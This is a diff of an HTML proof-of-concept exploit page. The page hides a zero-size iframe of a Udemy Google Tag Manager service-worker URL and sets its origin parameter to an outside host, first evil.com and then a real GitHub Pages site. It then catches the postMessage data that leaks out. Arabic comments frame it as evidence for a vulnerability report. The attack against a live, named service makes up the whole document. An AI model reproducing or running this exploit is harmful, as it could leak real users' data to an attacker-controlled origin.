@@ -7,7 +7,7 @@
     <h1>Loading Vulnerable Iframe...</h1>
     
     <iframe id="targetFrame" 
-        src="https://gtm.udemy.com/_/service_worker/5a20/sw_iframe.html?origin=https%3A%2F%2Fevil.com&1p=1" 
+        src="https://gtm.udemy.com/_/service_worker/5a20/sw_iframe.html?origin=https%3A%2F%2Fmahmoudsamy007.github.io%2Ftutorial-project-fakebook&1p=1" 
         style="width:0; height:0; border:none; visibility:hidden;">
     </iframe>
 
@@ -19,7 +19,7 @@
                 
                 // **** النجاح هنا! إذا رأيت هذا التنبيه، فقد نجحت في توجيه البيانات إلى موقعك. ****
                 const receivedData = event.data;
-                console.log("SUCCESS! Data was leaked to evil.com:", receivedData);
+                console.log("SUCCESS! Data was leaked to tutorial-project-fakebook:", receivedData);
                 
                 // يمكنك استخدام alert لتوضيح النجاح في التقرير
                 alert("Vulnerability Confirmed! postMessage Target Origin Controlled by Attacker. Data: " + JSON.stringify(receivedData));
